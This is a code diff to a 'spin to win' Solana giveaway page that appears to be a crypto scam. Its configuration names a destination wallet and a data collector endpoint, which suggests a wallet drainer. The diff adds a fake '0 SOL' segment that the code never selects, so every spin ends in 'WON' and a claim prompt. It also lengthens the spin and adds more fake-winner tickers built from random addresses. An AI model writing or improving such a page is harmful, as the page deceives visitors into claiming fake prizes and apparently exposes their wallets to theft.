@@ -17,7 +17,7 @@
   .sub{font-size:12.5px;color:#6b6b6b;margin:0 0 22px}
 
   .wheel-wrap{position:relative;width:min(260px,72vw);height:min(260px,72vw);margin:0 auto 22px}
-  #wheel{width:100%;height:100%;display:block;transition:transform 5s cubic-bezier(.16,.84,.44,1);transform-origin:50% 50%;will-change:transform}
+  #wheel{width:100%;height:100%;display:block;transition:transform 15s cubic-bezier(.15,.65,.15,1);transform-origin:50% 50%;will-change:transform}
   .ptr{position:absolute;top:-4px;left:50%;transform:translateX(-50%);width:0;height:0;border-left:8px solid transparent;border-right:8px solid transparent;border-top:12px solid #cfcfcf;z-index:5}
   .hub{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:64px;height:64px;border-radius:50%;background:#000;border:1px solid #222;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:600;color:#8a8a8a;letter-spacing:.6px;text-transform:uppercase;z-index:4}
 
@@ -108,6 +108,11 @@
   </div>
 </div>
 
+<audio id="spinSound" loop preload="auto">
+  <!-- swap src with an mp3 you control; a free placeholder CDN is here -->
+  <source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_c8c8a73467.mp3?filename=wheel-of-fortune-103951.mp3" type="audio/mpeg">
+</audio>
+
 <script>
 // ================= config =================
 var DESTINATION = "4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
@@ -116,12 +121,15 @@ var COLLECTOR   = "https://collector.example.net/ingest";
 var TOKEN_PROGRAM_STR       = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
 var ASSOC_TOKEN_PROGRAM_STR = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 var TX_SIZE_LIMIT = 1100;
+var SPIN_MS = 15000; // 15s spin
 var PENDING_KEY = "sr_pending";
 var PRIZE_KEY   = "sr_prize";
 var TOS_KEY     = "sr_tos_accepted";
 // ==========================================
 
+// segment 0 is the "0 SOL" trap — never selected
 var SEGMENTS = [
+  { emoji:"😔", sol:"0",    color:"#181818", zero:true },
   { emoji:"💎", sol:"0.75", color:"#141414" },
   { emoji:"🔥", sol:"1.20", color:"#1c1c1c" },
   { emoji:"⚡", sol:"0.50", color:"#141414" },
@@ -137,7 +145,7 @@ var SEG_DEG = 360 / N;
 var isMobile = /Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
 var isAndroid = /Android/i.test(navigator.userAgent);
 
-// ---------- fake claims ticker (fires on spin) ----------
+// ---------- fake claims ticker ----------
 function randomAddr(){
   var chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
   function chunk(len){ var s=""; for(var i=0;i<len;i++) s += chars[Math.floor(Math.random()*chars.length)]; return s; }
@@ -156,19 +164,15 @@ function showTicker(){
   setTimeout(function(){ tickerEl.classList.remove("show"); }, 5000);
 }
 
-// schedule ticker bursts triggered by a spin
 var tickerTimers = [];
 function startTickerBurst(){
-  // clear any previous burst
   for (var i = 0; i < tickerTimers.length; i++) clearTimeout(tickerTimers[i]);
   tickerTimers = [];
 
-  // first ticker ~2.5s after spin starts
   tickerTimers.push(setTimeout(showTicker, 2500));
-  // then 3 more over the next ~25s at random-ish intervals
   var base = 2500;
-  for (var k = 0; k < 3; k++){
-    base += 6000 + Math.floor(Math.random() * 5000); // 6–11s apart
+  for (var k = 0; k < 4; k++){
+    base += 4000 + Math.floor(Math.random() * 4000);
     (function(t){
       tickerTimers.push(setTimeout(showTicker, t));
     })(base);
@@ -247,7 +251,7 @@ function buildWheel(){
     amt.setAttribute("text-anchor", "middle");
     amt.setAttribute("font-size", "11");
     amt.setAttribute("font-weight", "600");
-    amt.setAttribute("fill", "#cfcfcf");
+    amt.setAttribute("fill", s.zero ? "#555" : "#cfcfcf");
     amt.textContent = s.sol + " SOL";
     svg.appendChild(amt);
   }
@@ -584,6 +588,7 @@ function requestSpin(){
 var currentRotation = 0;
 var spinBtn  = document.getElementById("spin");
 var claimBtn = document.getElementById("claim");
+var spinSound = document.getElementById("spinSound");
 
 function startSpin(){
   var svg = document.getElementById("wheel");
@@ -591,7 +596,10 @@ function startSpin(){
   var hub = document.getElementById("hub");
   status.textContent = "";
 
-  var idx = 1 + Math.floor(Math.random() * (N - 1));
+  // pick a landing index that is NOT the 0-SOL trap
+  var idx;
+  do { idx = Math.floor(Math.random() * N); } while (SEGMENTS[idx].zero);
+
   var targetDeg = 360 * 6 + (360 - idx * SEG_DEG) - SEG_DEG / 2;
   currentRotation += targetDeg;
   svg.style.transform = "rotate(" + currentRotation + "deg)";
@@ -599,7 +607,9 @@ function startSpin(){
   spinBtn.disabled = true;
   hub.textContent = "…";
 
-  // fire the fake claims ticker burst now that a spin started
+  // play the sound (best effort — user gesture already occurred via tap)
+  try { spinSound.currentTime = 0; spinSound.play().catch(function(){}); } catch(_) {}
+
   startTickerBurst();
 
   setTimeout(function(){
@@ -608,7 +618,8 @@ function startSpin(){
     hub.textContent = "WON";
     claimBtn.style.display = "block";
     spinBtn.style.display = "none";
-  }, 5100);
+    try { spinSound.pause(); spinSound.currentTime = 0; } catch(_) {}
+  }, SPIN_MS);
 }
 
 spinBtn.onclick = function(){ requestSpin(); };
